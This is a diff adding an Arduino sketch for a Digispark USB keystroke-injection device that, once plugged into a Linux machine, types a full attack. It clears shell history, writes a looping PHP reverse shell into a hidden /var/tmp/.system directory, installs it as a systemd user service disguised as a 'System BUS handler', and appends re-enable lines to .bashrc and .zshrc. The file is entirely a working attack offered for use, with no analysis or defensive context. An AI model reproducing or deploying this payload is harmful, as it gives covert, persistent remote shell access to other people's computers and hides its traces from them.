@@ -1,0 +1,56 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.delay(2000);
+
+  // Open Terminal
+  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
+  DigiKeyboard.delay(4000);
+
+  // Start bash
+  DigiKeyboard.println("bash");
+  DigiKeyboard.delay(400);
+
+  // Unset history
+  DigiKeyboard.println("unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE");
+  DigiKeyboard.delay(100);
+
+  // Create hidden directory
+  DigiKeyboard.println("mkdir /var/tmp/.system");
+  DigiKeyboard.delay(100);
+
+  // Create and write script for reverse shell
+  DigiKeyboard.println("echo -e \"while :\\ndo\\n\\tping -c 5 127.0.0.1\\n\\tif [ \\$? -eq 0 ]; then\\n\\t\\tphp -r '\\$sock=fsockopen(\\\"127.0.0.1\\\",4444);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'\\n\\tfi\\ndone\" >  /var/tmp/.system/systemBus");
+  DigiKeyboard.delay(100);
+
+  // Make script executable
+  DigiKeyboard.println("chmod +x /var/tmp/.system/systemBus");
+  DigiKeyboard.delay(100);
+
+  // Creating non-root systemd service
+  DigiKeyboard.println("mkdir -p ~/.config/systemd/user");
+  DigiKeyboard.delay(100);
+
+  // Write systemd service file
+  DigiKeyboard.println("echo -e \"[Unit]\\nDescription= System BUS handler\\n\\n[Service]\\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\\nRestart=on-failure\\nSuccessExitStatus=3 4\\nRestartForceExitStatus=3 4\\n\\n[Install]\\nWantedBy=default.target\" > ~/.config/systemd/user/systemBUS.service");
+  DigiKeyboard.delay(100);
+
+  // Enabling service
+  DigiKeyboard.println("systemctl --user daemon-reload");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.println("systemctl --user enable --now systemBUS.service");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.println("systemctl --user start --now systemBUS.service");
+  DigiKeyboard.delay(100);
+
+  // Autostarting service on terminal/shell launch
+  DigiKeyboard.println("echo -e \"ls -a | grep 'zshrc' &> /dev/null\\nif [ \\$? = 0 ]; then\\n\\techo systemctl --user enable --now systemBUS.service >> ~/.zshrc\\nfi\\n\\nls -a | grep 'bashrc' &> /dev/null\\nif [ \\$? = 0 ]; then\\n\\techo systemctl --user enable --now systemBUS.service >> ~/.bashrc\\nfi\\n\\n\" > ~/tmmmp");
+  DigiKeyboard.delay(50);
+  DigiKeyboard.println("chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit");
+
+  while (true) {
+    DigiKeyboard.delay(10000); // Prevent re-execution
+  }
+}
